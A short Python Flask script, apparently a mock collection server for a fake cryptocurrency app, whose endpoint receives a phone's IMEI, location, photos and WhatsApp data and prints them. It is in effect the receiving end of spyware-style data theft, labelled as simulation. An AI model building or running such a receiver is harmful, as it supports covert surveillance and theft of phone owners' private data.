from flask import Flask, request, jsonify
import random
import json

app = Flask(__name__)

# Endpoint to receive data from the fake client
@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    imei = data.get('imei', '')
    location = data.get('location', '')
    photos = data.get('photos', [])
    whatsapp_data = data.get('whatsapp_data', {})

    # You can simulate some processing here
    print(f"Received data from IMEI: {imei}")
    print(f"Location: {location}")
    print(f"WhatsApp Data: {whatsapp_data}")
    print(f"Photos: {len(photos)} fake photos")

    # Simulating a response back to the client
    response = {
        'status': 'success',
        'message': 'Connection received. Fake cryptocurrency app started.'
    }
    return jsonify(response)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
